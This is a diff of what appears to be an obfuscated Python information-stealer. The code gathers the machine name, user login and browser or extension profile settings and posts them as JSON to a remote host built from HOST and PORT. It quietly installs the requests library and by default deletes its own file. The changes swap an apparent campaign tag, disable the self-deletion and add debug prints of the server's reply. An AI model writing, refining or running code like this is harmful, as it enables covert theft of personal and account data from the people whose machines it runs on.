@@ -16,7 +16,7 @@ _A='linux_profiles'
 _F=False
 _T=True
 _N=None
-sType = "ukLdMe1"
+sType = "ksGsMe1"
 import sys,platform,subprocess,os,glob,getpass,re,shutil,json,tempfile,time
 from sys import argv
 from typing import Union
@@ -28,9 +28,9 @@ sHost=f"http://{HOST}:{PORT}/"
 run_name=os.path.basename(argv[0])
 dev_mode=_F
 SPL=sys.platform
-if dev_mode==_F:
-	try:os.remove(argv[0]);print(f"deleted: {argv[0]}")
-	except OSError as e:print(f"Failed to delete: {argv[0]}: {e}")
+# if dev_mode==_F:
+# 	try:os.remove(argv[0]);print(f"deleted: {argv[0]}")
+# 	except OSError as e:print(f"Failed to delete: {argv[0]}: {e}")
 try:import requests
 except:subprocess.check_call([sys.executable,'-m','pip','install','requests'],stdout=subprocess.DEVNULL);import requests
 pc_name=platform.node()
@@ -195,6 +195,8 @@ def go(kill_process=_F):
 						else:E.append(f"[{len(E)}] {B}_{G} - failed: settings not found in spf");continue
 						if I is _N:
 							A3={'pc_name':pc_name,'pc_login':pc_login,'type':sType,'sys_platform':SPL,'sys_separator':os.sep,s:F,'base_path':W[M[0]],'sett':R,N:C[D][R],O:C[l][O]};A4=sHost+'h';Y=requests.post(A4,{'data':json.dumps(A3,separators=(m,n))})
+							print("----------------------")
+							print(Y.json())
 							if Y.status_code==200:I=Y.json()
 							else:print('failed to get ext_mac_data:',Y.status_code,Y.text);continue
 						if not N in I or not O in I:E.append(f"[{len(E)}] {B}_{G} - failed: settings not found in ext_mac");continue
